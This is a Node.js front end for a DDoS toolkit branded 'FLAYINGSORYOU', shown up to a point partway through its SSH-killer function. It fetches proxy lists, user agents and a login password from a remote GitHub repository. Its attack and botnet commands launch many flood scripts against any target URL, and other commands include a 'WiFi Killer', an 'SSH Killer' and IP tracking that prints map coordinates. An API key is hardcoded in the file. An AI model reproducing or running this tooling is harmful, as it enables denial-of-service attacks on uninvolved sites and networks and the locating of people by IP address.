#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const { parseTimezone } = require('timezone-support');
const path = require('path')
const version = '4.0.0'
let processList = [];
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksmerah = '\x1b[31m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const hijau = '\x1b[38;2;144;238;144m'
const { parsePhoneNumberFromString, getCountryCallingCode } = require('libphonenumber-js');
const carrier = require('libphonenumber-js/metadata.min.json');  // Pustaka metadata untuk detail negara
const geocoder = require('libphonenumber-js/metadata.min.json'); // Pustaka metadata untuk detail geografi
const timezone = require('timezone-support');                    // Untuk info zona waktu

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀

            TOOLS FLAYINGSORYOU 
 
Version: ${version}
Telegram: ${biru} @FLAYINGSORYOU ${Reset}
WELCOME DI SC TOOLS DDOS FLAYINGSORYOU
Type ${bold}${hijau}"Botnetsrv"${Reset} For Showing All Server Menu
========================================================================`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/master/proxysoryou.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/master/ua1.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/main/version.txt');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/dalyudiyudi12345/kamunanya/main/Kepo.txt');
    const password = await secretBangetJir.text();
    await console.log(`LOGIN MASUKAN PASSWORD`)
    permen.question('[\x1b[1m\x1b[31mFlayingSecurity\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`Successfuly Login`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome To Flaying Tools ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`Type "Menu" For Showing All Available Command`)
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      console.log(`Waiting Auto Update...`)
      await exec(`npm uninstall -g flayingsoryou-tools`)
      console.log(`Installing update`)
      await exec(`npm i -g flayingsoryou-tools`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
WiFi Killer Has Started
Type exit To Stop
`);
permen.question('[\x1b[1m\x1b[31mFLAYING Wifi Killer\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  startKillwiFi.kill('SIGKILL')
  console.log(`WiFi Killer Has Ended`)
  sigma()
} else {
  console.log(`do you mean 'exit'?`)
  sigma()
}})
}
// [========================================] //
async function AttackBotnetEndpoints(args) {
  if (args.length < 3) {
    console.log(`Example: Botnet <target> <duration> <methods>
Botnet https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀
           ${bold}${teksmerah}Attack Sent To All Server${Reset}
               Type ${bold}${biru}"C"${Reset} to clear terminal
========================================================================
Target: ${target}
Duration: ${duration}
Methods: ${methods}
Concurrents: 1/1
ISP: ${result.isp}
Ip: ${result.query}
AS: ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
	} else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`)
          sigma()
	} else if (methods === 'https') {
       pushOngoing(target, methods, duration)
const kikaz = path.join(__dirname, `/lib/cache/kikaz.js`);
const bypass = path.join(__dirname, `/lib/cache/bypass.js`);
const tls = path.join(__dirname, `/lib/cache/tls.js`);
const klasic = path.join(__dirname, `/lib/cache/klasic.js`);
const vxn = path.join(__dirname, `/lib/cache/vxn.js`);
const xin = path.join(__dirname, `/lib/cache/xin.js`);
const cookie = path.join(__dirname, `/lib/cache/cookie.js`);
const maklo = path.join(__dirname, `/lib/cache/maklo.js`);
const mixmax = path.join(__dirname, `/lib/cache/mixmax.js`);
        exec(`node ${kikaz} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${bypass} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${tls} ${target} 10 100 ${duration}`)
        exec(`node ${klasic} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${vxn} ${target} ${duration}`)
        exec(`node ${xin} ${target} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${cookie} ${target} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${maklo} ${target} ${target} ${duration} 100 10 proxy.txt`) 
        exec(`node ${mixmax} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'vip') {
       pushOngoing(target, methods, duration)
const ciko = path.join(__dirname, `/lib/cache/ciko.js`);
const flood = path.join(__dirname, `/lib/cache/flood.js`);
const cyn = path.join(__dirname, `/lib/cache/cyn.js`);
        exec(`node ${ciko} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${flood} ${target} ${duration}`)
        exec(`node ${cyn} ${target} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'soryou') {
       pushOngoing(target, methods, duration)
       const strike = path.join(__dirname, `/lib/cache/strike.js`);
const flayingraw = path.join(__dirname, `/lib/cache/flayingraw.js`);
const hyper = path.join(__dirname, `/lib/cache/hyper.js`);
const bomba = path.join(__dirname, `/lib/cache/bomba.js`);
        exec(`node ${strike} GET ${target} ${duration} 10 100 proxy.txt --full`)
        exec(`node ${flayingraw} ${target} ${duration}`)
        exec(`node ${hyper} ${target} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${bomba} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'sigma') {
       pushOngoing(target, methods, duration)
       const tls = path.join(__dirname, `/lib/cache/tls.js`);
       const maklo = path.join(__dirname, `/lib/cache/maklo.js`);
       const cyn = path.join(__dirname, `/lib/cache/cyn.js`);
       const ciko = path.join(__dirname, `/lib/cache/ciko.js`);
       const kikaz = path.join(__dirname, `/lib/cache/kikaz.js`);
       const mixmax = path.join(__dirname, `/lib/cache/mixmax.js`);
       exec(`node ${tls} ${target} 50 443 ${duration}`)
       exec(`node ${maklo} ${target} ${target} ${duration} 443 50 proxy.txt`) 
       exec(`node ${cyn} ${target} ${target} ${duration} 443 50 proxy.txt`)
       exec(`node ${ciko} ${target} ${duration} 443 50 proxy.txt`)
       exec(`node ${kikaz} ${target} ${duration} 443 50 proxy.txt`)
       exec(`node ${mixmax} ${target} ${duration} 443 50 proxy.txt`)
          sigma() 
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀
           Tracking IP Address Result 
========================================================================
 - Flags: ${ipInfo.country_flag}
 - Country: ${ipInfo.country_name}
 - Capital: ${ipInfo.country_capital}
 - City: ${ipInfo.city}
 - ISP: ${ipInfo.isp}
 - Organization: ${ipInfo.organization}
 - lat: ${ipInfo.latitude}
 - long: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: Attack <target> <duration> <methods>
Attack https://google.com 120 flood`);
    sigma();
	return
  }
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀
           ${bold}${teksmerah}Attack Sent To All Server${Reset}
               Type ${bold}${biru}"C"${Reset} to clear terminal
========================================================================
Target: ${target}
Duration: ${duration}
Methods: ${methods}
Concurrents: 1/1
ISP: ${result.isp}
Ip: ${result.query}
AS: ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 443 50`)
        sigma()
        } else if (methods === 'flood') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 443 50`)
        sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 443 50 proxy.txt`)
          sigma()
          } else if (methods === 'cookie') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 443 50 proxy.txt`)
          sigma()
          } else if (methods === 'mixmax') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 443 50 proxy.txt`)
          sigma()
          } else if (methods === 'hyper') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 443 50 proxy.txt`)
          sigma()
          } else if (methods === 'boti') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
          } else if (methods === 'bomba') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
          } else if (methods === 'glory') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
          } else if (methods === 'maklo') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
          sigma()
          } else if (methods === 'random') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 50 proxy.txt`)
          sigma()
          } else if (methods === 'tls') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} 50 443 ${duration}`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'xyn') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
          } else if (methods === 'zan') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 64 5 proxy.txt`)
          sigma()
          } else if (methods === 'kikaz') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`)
          sigma()
          } else if (methods === 'zxm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`)
          sigma()
          } else if (methods === 'cyn') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`)
          sigma()
          } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`)
          sigma()
          } else if (methods === 'ciko') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 443 50 proxy.txt`)
          sigma()
          } else if (methods === 'vyn') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`)
          sigma()
          } else if (methods === 'flaying-raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'klasic') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`)
          sigma()
          } else if (methods === 'vxn') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`)
          sigma()
          } else if (methods === 'xin') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 2 proxy.txt`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120 flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⢀⡀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢀⡞⠹⡄⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⢠⠞⠁⠀⠸⡆⠈⢧⡀⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠰⡒⠒⠒⠒⠒⠒⡾⠃⣠⠟⠙⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡽
⠀⠀⢱⡀⠀⢦⢤⡾⠁⢠⠯⠤⠴⠦⠤⠴⠒⠒⣶⣶⡿⣖⣲⠃⠀⢀⡼⠁
⠀⠀⠀⠳⡄⠘⢿⡀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠹⣇⠀⢀⡞⠀⠀
⠀⠀⠀⠀⢹⡆⠈⢷⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠙⣦⠏⠀⠀⠀
⠀⠀⠀⣰⢿⣿⣄⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢦⠀⠹⡄⠀⠀⠀
⠀⠀⢠⠏⠀⢻⠛⣆⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⢧⠀⠹⡄⠀⠀
⠀⢠⡟⠀⢠⣏⣀⣘⣦⣀⣳⡀⠀⣀⣀⡀⢀⡼⠃⠀⣴⣃⣘⣆⠀⠹⡄⠀
⢠⠏⠀⠀⠈⠁⠉⠉⠉⠉⠉⠉⠉⠉⠉⢉⡿⠁⢀⡾⠉⠉⠁⠈⠀⠀⠘⡆
⠞⠒⠲⠶⠖⠶⠒⠚⠓⠲⢶⣶⣶⡶⢶⡞⠁⢠⡟⠒⠒⠚⠓⠛⠉⠉⠉⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡋⠘⠋⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡄⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

            SSH Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
